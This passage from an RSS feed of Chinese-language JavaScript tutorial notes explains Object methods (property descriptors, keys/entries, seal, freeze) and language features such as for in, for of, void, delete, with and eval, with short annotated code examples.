Object<span>.</span><span>getOwnPropertyDescriptor</span><span>(</span>foo<span>,</span> <span>'name'</span><span>)</span> <span>// => {value: '徐扶墙', writable: true, enumerable: false, configurable: false}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br></div></div><h2 id="_12-object-getownpropertydescriptors-object"> 12. Object.getOwnPropertyDescriptors(object)</h2>
<ul>
<li>获取自身所有属性的描述符。</li>
</ul>
<div><pre><code><span>const</span> foo <span>=</span> <span>{</span><span>}</span>

Object<span>.</span><span>defineProperties</span><span>(</span>foo<span>,</span> <span>{</span>
  <span>name</span><span>:</span> <span>{</span>
    <span>value</span><span>:</span> <span>'徐扶墙'</span><span>,</span>
    <span>enumerable</span><span>:</span> <span>true</span><span>,</span>
  <span>}</span><span>,</span>
  <span>age</span><span>:</span> <span>{</span>
    <span>get</span><span>(</span><span>)</span> <span>{</span>
      <span>return</span> <span>'获取age值'</span>
    <span>}</span><span>,</span>
    <span>set</span><span>(</span>newValue<span>)</span> <span>{</span>
      <span>return</span> <span>'设置age值'</span>
    <span>}</span><span>,</span>
  <span>}</span><span>,</span>
<span>}</span><span>)</span>

Object<span>.</span><span>getOwnPropertyDescriptors</span><span>(</span>foo<span>)</span> <span>// => {name: {value: '徐扶墙', writable: false, enumerable: true, configurable: false}, age: {enumerable: false, configurable: false, get: ƒ, set: ƒ}}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br></div></div><h2 id="_13-propertyisenumerable-prop"> 13. propertyIsEnumerable(prop)</h2>
<ul>
<li>检测属性是否可枚举。</li>
</ul>
<div><pre><code><span>const</span> foo <span>=</span> <span>{</span><span>}</span>
Object<span>.</span><span>defineProperties</span><span>(</span>foo<span>,</span> <span>{</span>
  <span>name</span><span>:</span> <span>{</span>
    <span>value</span><span>:</span> <span>'徐扶墙'</span><span>,</span>
    <span>enumerable</span><span>:</span> <span>true</span><span>,</span>
  <span>}</span><span>,</span>
  <span>age</span><span>:</span> <span>{</span>
    <span>get</span><span>(</span><span>)</span> <span>{</span>
      <span>return</span> <span>17</span>
    <span>}</span><span>,</span>
  <span>}</span><span>,</span>
<span>}</span><span>)</span>

foo<span>.</span><span>propertyIsEnumerable</span><span>(</span><span>'name'</span><span>)</span> <span>// => true</span>
foo<span>.</span><span>propertyIsEnumerable</span><span>(</span><span>'age'</span><span>)</span> <span>// => false</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br></div></div><h2 id="_14-object-keys-object-object-values-object-object-entries-object"> 14. Object.keys(object) &amp; Object.values(object) &amp; Object.entries(object)</h2>
<ul>
<li>返回由对象自身 key/value/[key, value] 组成的数组，不包含不可枚举属性。</li>
</ul>
<div><pre><code><span>const</span> foo <span>=</span> <span>{</span><span>}</span>
Object<span>.</span><span>defineProperties</span><span>(</span>foo<span>,</span> <span>{</span>
  <span>name</span><span>:</span> <span>{</span>
    <span>value</span><span>:</span> <span>'徐扶墙'</span><span>,</span>
    <span>enumerable</span><span>:</span> <span>true</span><span>,</span>
  <span>}</span><span>,</span>
  <span>age</span><span>:</span> <span>{</span>
    <span>enumerable</span><span>:</span> <span>true</span><span>,</span>
    <span>get</span><span>(</span><span>)</span> <span>{</span>
      <span>return</span> <span>17</span>
    <span>}</span><span>,</span>
  <span>}</span><span>,</span>
  <span>wife</span><span>:</span> <span>{</span>
    <span>value</span><span>:</span> <span>'裴南苇'</span><span>,</span>
  <span>}</span><span>,</span>
<span>}</span><span>)</span>

Object<span>.</span><span>keys</span><span>(</span>foo<span>)</span> <span>// => ['name', 'age']</span>
Object<span>.</span><span>values</span><span>(</span>foo<span>)</span> <span>// => ['徐扶墙', 17]</span>
Object<span>.</span><span>entries</span><span>(</span>foo<span>)</span> <span>// => [['name', '徐扶墙'], ['age', 17]]</span>

Object<span>.</span><span>keys</span><span>(</span><span>[</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>]</span><span>)</span> <span>// => ['0', '1', '2']</span>
Object<span>.</span><span>values</span><span>(</span><span>'neo'</span><span>)</span> <span>// => ['n', 'e', 'o']</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br></div></div><h2 id="_15-object-getownpropertynames"> 15. Object.getOwnPropertyNames()</h2>
<ul>
<li>返回自身属性组成的数组，包含不可枚举属性。</li>
</ul>
<div><pre><code><span>const</span> foo <span>=</span> <span>{</span><span>}</span>
Object<span>.</span><span>defineProperties</span><span>(</span>foo<span>,</span> <span>{</span>
  <span>name</span><span>:</span> <span>{</span>
    <span>value</span><span>:</span> <span>'徐扶墙'</span><span>,</span>
    <span>enumerable</span><span>:</span> <span>true</span><span>,</span>
  <span>}</span><span>,</span>
  <span>age</span><span>:</span> <span>{</span>
    <span>enumerable</span><span>:</span> <span>true</span><span>,</span>
    <span>get</span><span>(</span><span>)</span> <span>{</span>
      <span>return</span> <span>17</span>
    <span>}</span><span>,</span>
  <span>}</span><span>,</span>
  <span>wife</span><span>:</span> <span>{</span>
    <span>value</span><span>:</span> <span>'裴南苇'</span><span>,</span>
    <span>enumerable</span><span>:</span> <span>false</span><span>,</span>
  <span>}</span><span>,</span>
<span>}</span><span>)</span>

Object<span>.</span><span>getOwnPropertyNames</span><span>(</span>foo<span>)</span> <span>// => ['name', 'age', 'wife']</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br></div></div><h2 id="_16-object-fromentries-iterable"> 16. Object.fromEntries(iterable)</h2>
<ul>
<li>将键值对列表转换为一个对象。</li>
</ul>
<div><pre><code>Object<span>.</span><span>fromEntries</span><span>(</span>Object<span>.</span><span>entries</span><span>(</span><span>{</span> <span>name</span><span>:</span> <span>'徐扶墙'</span><span>,</span> <span>age</span><span>:</span> <span>17</span> <span>}</span><span>)</span><span>)</span> <span>// => {name: '徐扶墙', age: 17}</span>

Object<span>.</span><span>fromEntries</span><span>(</span>
  <span>new</span> <span>Map</span><span>(</span><span>[</span>
    <span>[</span><span>'name'</span><span>,</span> <span>'徐扶墙'</span><span>]</span><span>,</span>
    <span>[</span><span>'age'</span><span>,</span> <span>17</span><span>]</span><span>,</span>
  <span>]</span><span>)</span>
<span>)</span> <span>// => {name: '徐扶墙', age: 17}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br></div></div><h2 id="_17-object-getownpropertysymbols-object"> 17. Object.getOwnPropertySymbols(object)</h2>
<ul>
<li>返回自身的所有的 Symbol 属性组成的数组。</li>
</ul>
<div><pre><code><span>const</span> foo <span>=</span> <span>{</span>
  <span>[</span><span>Symbol</span><span>(</span><span>'name'</span><span>)</span><span>]</span><span>:</span> <span>'徐扶墙'</span><span>,</span>
  <span>[</span><span>Symbol</span><span>(</span><span>'age'</span><span>)</span><span>]</span><span>:</span> <span>17</span><span>,</span>
  <span>wife</span><span>:</span> <span>'裴南苇'</span><span>,</span>
<span>}</span>

Object<span>.</span><span>getOwnPropertySymbols</span><span>(</span>foo<span>)</span> <span>// => [Symbol(name), Symbol(age)]</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br></div></div><h2 id="_18-object-is-value-value"> 18. Object.is(value, value)</h2>
<ul>
<li>最准确的比较方式，效率不高，主要用来解决下面两种情况（NaN 可用 Number.isNaN() 方法判断）。</li>
</ul>
<div><pre><code>Object<span>.</span><span>is</span><span>(</span><span>+</span><span>0</span><span>,</span> <span>-</span><span>0</span><span>)</span> <span>// => false</span>
Object<span>.</span><span>is</span><span>(</span><span>NaN</span><span>,</span> <span>NaN</span><span>)</span> <span>// => true</span>

<span>+</span><span>0</span> <span>===</span> <span>-</span><span>0</span> <span>// => true</span>
<span>NaN</span> <span>===</span> <span>NaN</span> <span>// => false</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br></div></div><h2 id="_19-object-preventextensions-object"> 19. Object.preventExtensions(object)</h2>
<ul>
<li>浅禁止对象扩展，可删除属性，可重新配置（Object.defineProperty() | Object.defineProperties()）。</li>
</ul>
<div><pre><code><span>const</span> foo <span>=</span> <span>{</span>
  <span>name</span><span>:</span> <span>'徐扶墙'</span><span>,</span>
  <span>harem</span><span>:</span> <span>{</span>
    <span>bigWife</span><span>:</span> <span>'姜姒'</span><span>,</span>
  <span>}</span><span>,</span>
<span>}</span>

Object<span>.</span><span>preventExtensions</span><span>(</span>foo<span>)</span>
foo<span>.</span>age <span>=</span> <span>17</span>
foo<span>.</span>harem<span>.</span>smallWife <span>=</span> <span>'裴南苇'</span>
<span>delete</span> foo<span>.</span>harem<span>.</span>bigWife <span>// => true</span>
console<span>.</span><span>log</span><span>(</span>foo<span>)</span> <span>// => {name: '徐扶墙', harem: {smallWife: '裴南苇'}}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br></div></div><h2 id="_20-object-isextensible-object"> 20. Object.isExtensible(object)</h2>
<ul>
<li>判断对象是否可扩展。</li>
</ul>
<div><pre><code><span>const</span> foo <span>=</span> <span>{</span>
  <span>name</span><span>:</span> <span>'徐扶墙'</span><span>,</span>
  <span>age</span><span>:</span> <span>17</span><span>,</span>
  <span>harem</span><span>:</span> <span>{</span>
    <span>bigWife</span><span>:</span> <span>'姜姒'</span><span>,</span>
    <span>smallWife</span><span>:</span> <span>'裴南苇'</span><span>,</span>
  <span>}</span><span>,</span>
<span>}</span>

Object<span>.</span><span>preventExtensions</span><span>(</span>foo<span>)</span>
Object<span>.</span><span>isExtensible</span><span>(</span>foo<span>)</span> <span>// => false</span>
Object<span>.</span><span>isExtensible</span><span>(</span>foo<span>.</span>harem<span>)</span> <span>// => true</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br></div></div><h2 id="_21-object-seal-object"> 21. Object.seal(object)</h2>
<ul>
<li>浅密封对象，不可扩展，不可删除属性，不可重新配置（Object.defineProperty() | Object.defineProperties()）。</li>
</ul>
<div><pre><code><span>const</span> foo <span>=</span> <span>{</span>
  <span>name</span><span>:</span> <span>'徐扶墙'</span><span>,</span>
  <span>harem</span><span>:</span> <span>{</span>
    <span>bigWife</span><span>:</span> <span>'姜姒'</span><span>,</span>
    <span>smallWife</span><span>:</span> <span>'裴南苇'</span><span>,</span>
  <span>}</span><span>,</span>
<span>}</span>

Object<span>.</span><span>seal</span><span>(</span>foo<span>)</span>
foo<span>.</span>age <span>=</span> <span>17</span>
<span>delete</span> foo<span>.</span>name <span>// => false</span>
<span>delete</span> foo<span>.</span>harem<span>.</span>smallWife <span>// => true</span>
console<span>.</span><span>log</span><span>(</span>foo<span>)</span> <span>// => {name: '徐扶墙', harem: {bigWife: '姜姒'}}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br></div></div><h2 id="_22-object-issealed-object"> 22. Object.isSealed(object)</h2>
<ul>
<li>判断对象是否密封。</li>
</ul>
<div><pre><code><span>const</span> foo <span>=</span> <span>{</span>
  <span>name</span><span>:</span> <span>'徐扶墙'</span><span>,</span>
  <span>age</span><span>:</span> <span>17</span><span>,</span>
  <span>harem</span><span>:</span> <span>{</span>
    <span>bigWife</span><span>:</span> <span>'姜姒'</span><span>,</span>
    <span>smallWife</span><span>:</span> <span>'裴南苇'</span><span>,</span>
  <span>}</span><span>,</span>
<span>}</span>

Object<span>.</span><span>seal</span><span>(</span>foo<span>)</span>
Object<span>.</span><span>isSealed</span><span>(</span>foo<span>)</span> <span>// => true</span>
Object<span>.</span><span>isSealed</span><span>(</span>foo<span>.</span>harem<span>)</span> <span>// => false</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br></div></div><h2 id="_23-object-freeze-object"> 23. Object.freeze(object)</h2>
<ul>
<li>浅冻结对象，不可增删改对象属性，不可从新配置（Object.defineProperty() | Object.defineProperties()）。</li>
</ul>
<div><pre><code><span>const</span> foo <span>=</span> <span>{</span>
  <span>name</span><span>:</span> <span>'徐扶墙'</span><span>,</span>
  <span>age</span><span>:</span> <span>17</span><span>,</span>
  <span>harem</span><span>:</span> <span>{</span>
    <span>bigWife</span><span>:</span> <span>'姜姒'</span><span>,</span>
    <span>smallWife</span><span>:</span> <span>'裴南苇'</span><span>,</span>
  <span>}</span><span>,</span>
<span>}</span>

Object<span>.</span><span>freeze</span><span>(</span>foo<span>)</span>
foo<span>.</span>rank <span>=</span> <span>'天下第二'</span> <span>// => 无效</span>
foo<span>.</span>age <span>=</span> <span>18</span> <span>// => 无效</span>
<span>delete</span> foo<span>.</span>name <span>// => false</span>
foo<span>.</span>harem<span>.</span>smallWife <span>=</span> <span>'白狐儿脸'</span> <span>// => 有效</span>
console<span>.</span><span>log</span><span>(</span>foo<span>)</span> <span>// => { name: '徐扶墙', age: 17, harem: { bigWife: '姜姒', smallWife: '白狐儿脸' } }</span>

<span>// 深度冻结</span>
<span>function</span> <span>deepFreeze</span><span>(</span><span>obj</span><span>)</span> <span>{</span>
  <span>const</span> values <span>=</span> Object<span>.</span><span>values</span><span>(</span>obj<span>)</span>
  <span>if</span> <span>(</span>values<span>.</span>length<span>)</span>
    values<span>.</span><span>forEach</span><span>(</span><span>val</span> <span>=></span> <span>{</span>
      <span>if</span> <span>(</span><span>typeof</span> val <span>===</span> <span>'object'</span> <span>&amp;&amp;</span> val <span>!==</span> <span>null</span><span>)</span> <span>deepFreeze</span><span>(</span>val<span>)</span>
    <span>}</span><span>)</span>
  <span>return</span> Object<span>.</span><span>freeze</span><span>(</span>obj<span>)</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br></div></div><h2 id="_24-object-isfrozen-object"> 24. Object.isFrozen(object)</h2>
<ul>
<li>判断是否为冻结对象。</li>
</ul>
<div><pre><code><span>const</span> foo <span>=</span> <span>{</span>
  <span>name</span><span>:</span> <span>'徐扶墙'</span><span>,</span>
  <span>age</span><span>:</span> <span>17</span><span>,</span>
  <span>harem</span><span>:</span> <span>{</span>
    <span>bigWife</span><span>:</span> <span>'姜姒'</span><span>,</span>
    <span>smallWife</span><span>:</span> <span>'裴南苇'</span><span>,</span>
  <span>}</span><span>,</span>
<span>}</span>

Object<span>.</span><span>freeze</span><span>(</span>foo<span>)</span>

Object<span>.</span><span>isFrozen</span><span>(</span>foo<span>)</span> <span>// => true</span>
Object<span>.</span><span>isFrozen</span><span>(</span>foo<span>.</span>name<span>)</span> <span>// => true</span>
Object<span>.</span><span>isFrozen</span><span>(</span>foo<span>.</span>harem<span>)</span> <span>// => false</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br></div></div>]]></content:encoded>
    </item>
    <item>
      <title>其他</title>
      <link>https://www.matrixtheone.ga/web/note/js/Others/</link>
      <guid>https://www.matrixtheone.ga/web/note/js/Others/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">其他</source>
      <category>JS 基础</category>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
      <content:encoded><![CDATA[<h2 id="_1-for-in"> 1. for in</h2>
<ul>
<li>for in 遍历除 symbol 类型外的可枚举属性，会进行原型链查找。</li>
</ul>
<div><pre><code><span>function</span> <span>Foo</span><span>(</span><span>name<span>,</span> age</span><span>)</span> <span>{</span>
  <span>this</span><span>.</span>name <span>=</span> name
  <span>this</span><span>.</span>age <span>=</span> age
  <span>this</span><span>[</span><span>Symbol</span><span>(</span><span>7</span><span>)</span><span>]</span> <span>=</span> <span>7</span>
<span>}</span>
<span>Foo</span><span>.</span>prototype<span>.</span>wife <span>=</span> <span>'姜姒'</span>
<span>const</span> bar <span>=</span> <span>new</span> <span>Foo</span><span>(</span><span>'徐扶墙'</span><span>,</span> <span>17</span><span>)</span>

<span>for</span> <span>(</span><span>const</span> key <span>in</span> bar<span>)</span> console<span>.</span><span>log</span><span>(</span>key<span>,</span> bar<span>[</span>key<span>]</span><span>)</span> <span>// 依次打印：'name' '徐扶墙' -> 'age' 17 -> 'wife' '姜姒'</span>

<span>const</span> ary <span>=</span> <span>[</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>]</span>
<span>for</span> <span>(</span><span>const</span> index <span>in</span> ary<span>)</span> console<span>.</span><span>log</span><span>(</span>index<span>,</span> ary<span>[</span>index<span>]</span><span>)</span> <span>// 依次打印：'0' 1 -> '1' 2 -> '2' 3</span>

<span>const</span> str <span>=</span> <span>'love'</span>
<span>for</span> <span>(</span><span>const</span> index <span>in</span> str<span>)</span> console<span>.</span><span>log</span><span>(</span>index<span>,</span> str<span>[</span>index<span>]</span><span>)</span> <span>// 依次打印：'0' 'l' -> '1' 'o' -> '2' 'v' -> '3' 'e'</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br></div></div><h2 id="_2-for-of"> 2. for of</h2>
<ul>
<li>
<p>for of 遍历可迭代对象（通过 Symbol.iterator 定义迭代数据）。</p>
<div><pre><code><span>function</span> <span>Foo</span><span>(</span><span>name<span>,</span> age</span><span>)</span> <span>{</span>
  <span>this</span><span>.</span>name <span>=</span> name
  <span>this</span><span>.</span>age <span>=</span> age
<span>}</span>
<span>Foo</span><span>.</span>prototype<span>.</span>wife <span>=</span> <span>'姜姒'</span>
<span>const</span> bar <span>=</span> <span>new</span> <span>Foo</span><span>(</span><span>'徐扶墙'</span><span>,</span> <span>17</span><span>)</span>

<span>for</span> <span>(</span><span>const</span> <span>[</span>key<span>,</span> value<span>]</span> <span>of</span> Object<span>.</span><span>entries</span><span>(</span>bar<span>)</span><span>)</span> console<span>.</span><span>log</span><span>(</span>key<span>,</span> value<span>)</span> <span>// 依次打印：'name' '徐扶墙' -> 'age' 17</span>

<span>for</span> <span>(</span><span>const</span> value <span>of</span> <span>[</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>]</span><span>)</span> console<span>.</span><span>log</span><span>(</span>value<span>)</span> <span>// 依次打印：1 -> 2 -> 3</span>

<span>for</span> <span>(</span><span>const</span> value <span>of</span> <span>'love'</span><span>)</span> console<span>.</span><span>log</span><span>(</span>value<span>)</span> <span>// 依次打印：'l' -> 'o' -> 'v' -> 'e'</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br></div></div></li>
<li>
<p>与 for in 区别。</p>
<div><pre><code><span>const</span> ary <span>=</span> <span>[</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>]</span>
ary<span>.</span>neo <span>=</span> <span>'Neo'</span>
<span>Array</span><span>.</span>prototype<span>.</span>trinity <span>=</span> <span>'Trinity'</span>

<span>for</span> <span>(</span><span>const</span> index <span>in</span> ary<span>)</span> console<span>.</span><span>log</span><span>(</span>index<span>)</span> <span>// 依次打印：'0' -> '1' -> '2' -> 'neo' -> 'trinity'</span>

<span>for</span> <span>(</span><span>const</span> value <span>of</span> ary<span>)</span> console<span>.</span><span>log</span><span>(</span>value<span>)</span> <span>// 依次打印：1 -> 2 -> 3</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br></div></div></li>
<li>
<p>与 forEach、map 等 ES6 函数区别。</p>
<div><pre><code><span>const</span> ary <span>=</span> <span>[</span><span>3</span><span>,</span> <span>2</span><span>,</span> <span>1</span><span>]</span>
<span>function</span> <span>promise</span><span>(</span><span>num</span><span>)</span> <span>{</span>
  <span>return</span> <span>new</span> <span>Promise</span><span>(</span><span>(</span><span>resolve<span>,</span> reject</span><span>)</span> <span>=></span> <span>{</span>
    <span>setTimeout</span><span>(</span><span>(</span><span>)</span> <span>=></span> <span>resolve</span><span>(</span>num<span>)</span><span>,</span> <span>1000</span> <span>*</span> num<span>)</span>
  <span>}</span><span>)</span>
<span>}</span>

<span>function</span> <span>foo</span><span>(</span><span>)</span> <span>{</span>
  ary<span>.</span><span>forEach</span><span>(</span><span>async</span> <span>value</span> <span>=></span> console<span>.</span><span>log</span><span>(</span><span>await</span> <span>promise</span><span>(</span>value<span>)</span><span>)</span><span>)</span>
<span>}</span>

<span>async</span> <span>function</span> <span>bar</span><span>(</span><span>)</span> <span>{</span>
  <span>for</span> <span>(</span><span>const</span> value <span>of</span> ary<span>)</span> console<span>.</span><span>log</span><span>(</span><span>await</span> <span>promise</span><span>(</span>value<span>)</span><span>)</span>
<span>}</span>

<span>foo</span><span>(</span><span>)</span> <span>// 总耗时约3s，依次打印：1 -> 2 -> 3</span>
<span>bar</span><span>(</span><span>)</span> <span>// 总耗时约6s，依次打印：3 -> 2 -> 1</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br></div></div></li>
<li>
<p><a href="/note/books/You-Don’t-Know-JS-Vol3/#_1-迭代器">自定义迭代器</a>。</p>
<div><pre><code><span>const</span> foo <span>=</span> <span>{</span>
  <span>name</span><span>:</span> <span>'徐扶墙'</span><span>,</span>
  <span>age</span><span>:</span> <span>17</span><span>,</span>
  <span>[</span>Symbol<span>.</span>iterator<span>]</span><span>(</span><span>)</span> <span>{</span>
    <span>const</span> entries <span>=</span> Object<span>.</span><span>entries</span><span>(</span><span>this</span><span>)</span>
    <span>return</span> <span>{</span>
      <span>i</span><span>:</span> <span>-</span><span>1</span><span>,</span>
      <span>next</span><span>(</span><span>)</span> <span>{</span>
        <span>this</span><span>.</span>i<span>++</span>
        <span>if</span> <span>(</span><span>this</span><span>.</span>i <span>&lt;</span> entries<span>.</span>length<span>)</span> <span>return</span> <span>{</span> <span>value</span><span>:</span> entries<span>[</span><span>this</span><span>.</span>i<span>]</span><span>,</span> <span>done</span><span>:</span> <span>false</span> <span>}</span>
        <span>return</span> <span>{</span> <span>value</span><span>:</span> <span>undefined</span><span>,</span> <span>done</span><span>:</span> <span>true</span> <span>}</span>
      <span>}</span><span>,</span>
    <span>}</span>
  <span>}</span><span>,</span>
<span>}</span>

<span>for</span> <span>(</span><span>const</span> <span>[</span>key<span>,</span> value<span>]</span> <span>of</span> foo<span>)</span> console<span>.</span><span>log</span><span>(</span>key<span>,</span> value<span>)</span> <span>// 依次打印：'name' '徐扶墙' -> 'age' 17</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br></div></div></li>
</ul>
<h2 id="_3-void"> 3. void</h2>
<ul>
<li>
<p>void 任何值都会返回 undefined，在项目中推荐使用 void 0 代替 undefined（还有字数优势哟！）。</p>
<blockquote>
<p>在 JS 中 undefined 不属于关键字，因此 undefined 可做变量；低版本浏览器中可以改变 undefined 的值，高版本浏览器已经杜绝此现象。</p>
</blockquote>
</li>
</ul>
<div><pre><code><span>undefined</span> <span>===</span> <span>void</span> <span>0</span> <span>// => true</span>
</code></pre>
<div><span>1</span><br></div></div><h2 id="_4-delete"> 4. delete</h2>
<ul>
<li>
<p>delete 用于删除对象的某个属性，性能不好，一般不用，推荐使用 undefined 代替。</p>
</li>
<li>
<p><a href="https://juejin.cn/post/6972702293636415519" target="_blank" rel="noopener noreferrer">Why 系列：如无必要, don't 使用 delete - 云的世界</a></p>
</li>
</ul>
<div><pre><code><span>const</span> foo <span>=</span> <span>{</span>
  <span>name</span><span>:</span> <span>'徐扶墙'</span><span>,</span>
  <span>age</span><span>:</span> <span>17</span><span>,</span>
<span>}</span>
<span>const</span> ary <span>=</span> <span>[</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>]</span>
<span>const</span> str <span>=</span> <span>'clearlove7'</span>

<span>// 删除属性存在</span>
<span>delete</span> foo<span>.</span>name <span>// => true</span>
<span>// 删除属性不存在</span>
<span>delete</span> foo<span>.</span>wife <span>// => true</span>

<span>// 删除数组元素，删除项用 empty 占位，获取为 undefined，不能遍历，不会改变数组长度</span>
<span>delete</span> ary<span>[</span><span>1</span><span>]</span> <span>// => true</span>

<span>// 不能删除已声明变量，应使用 null 回收</span>
<span>delete</span> str <span>// => false</span>
<span>delete</span> bar <span>// => true</span>

<span>// 不声明变量，属性会定义在 window 下，可以删除</span>
num <span>=</span> <span>777</span>
console<span>.</span><span>log</span><span>(</span>num<span>)</span> <span>// => 777</span>
<span>delete</span> num <span>// => true</span>
console<span>.</span><span>log</span><span>(</span>num<span>)</span> <span>// => num is not defined</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br></div></div><h2 id="_5-with-object"> 5. with(object) { }</h2>
<ul>
<li>
<p>会扩展一个语句的作用域链，模版引擎编译常用语法，但性能不好（慎用）。</p>
</li>
<li>
<p>在内部中由于 var 声明没有块级作用域，将会声明在 object 下。</p>
</li>
</ul>
<div><pre><code><span>const</span> foo <span>=</span> <span>{</span>
  <span>name</span><span>:</span> <span>'徐扶墙'</span><span>,</span>
  <span>age</span><span>:</span> <span>17</span><span>,</span>
  <span>wife</span><span>:</span> <span>'姜姒'</span><span>,</span>
  <span>rank</span><span>:</span> <span>2</span><span>,</span>
<span>}</span>

<span>with</span> <span>(</span>foo<span>)</span> <span>{</span>
  <span>var</span> wife <span>=</span> <span>'裴南苇'</span>
  <span>let</span> name <span>=</span> <span>'徐凤年'</span>
  <span>const</span> age <span>=</span> <span>18</span>
  console<span>.</span><span>log</span><span>(</span>rank<span>)</span> <span>// => 2</span>
  console<span>.</span><span>log</span><span>(</span>foo<span>)</span> <span>// => {name: '徐扶墙', age: 17, wife: '裴南苇', rank: 2}</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br></div></div><h2 id="_6-eval-string"> 6. eval(string)</h2>
<ul>
<li>
<p>将传入的字符串当做 JavaScript 代码进行执行（慎用）。</p>
</li>
<li>
<p>通过 eval() 定义的任何变量和函数都不会被提升，这是因为在解析代码的时候，它们是被包含在一个字符串中的，它们只是在 eval() 执行的时候才会被创建。</p>
</li>
</ul>
<div><pre><code><span>eval</span><span>(</span><span>"console.log('执行代码')"</span><span>)</span> <span>// => "执行代码"</span>
</code></pre>
<div><span>1</span><br></div></div><h2 id="_7-label"> 7. label</h2>
<ul>
<li>为程序定义位置，可以使用 continue/break 跳到该位置。</li>
</ul>
<div><pre><code><span>const</span> ary <span>=</span> <span>[</span><span>]</span>

<span>jack</span><span>:</span> <span>for</span> <span>(</span><span>let</span> i <span>=</span> <span>1</span><span>;</span> i <span>&lt;</span> <span>20</span><span>;</span> i<span>++</span><span>)</span> <span>{</span>
